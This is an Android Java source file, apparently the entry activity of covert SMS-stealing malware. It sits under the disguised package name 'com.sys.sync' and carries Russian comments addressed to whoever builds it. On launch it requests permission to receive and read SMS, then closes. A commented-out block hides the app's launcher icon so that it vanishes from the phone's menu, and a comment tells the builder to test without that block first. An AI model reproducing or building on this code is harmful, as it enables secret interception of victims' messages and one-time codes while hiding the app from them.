package com.sys.sync;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.os.Bundle;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Запрос всего сразу. Один клик - и ты в дамках.
        requestPermissions(new String[]{
            Manifest.permission.RECEIVE_SMS, 
            Manifest.permission.READ_SMS
        }, 1);

        // СКРЫТИЕ ИКОНКИ (После запуска приложение исчезает из меню!)
        // ВНИМАНИЕ: На некоторых Android оно может перестать работать после этого,
        // поэтому протести сначала без этого блока.
        /*
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, com.sys.sync.MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        */

        finish();
    }
}
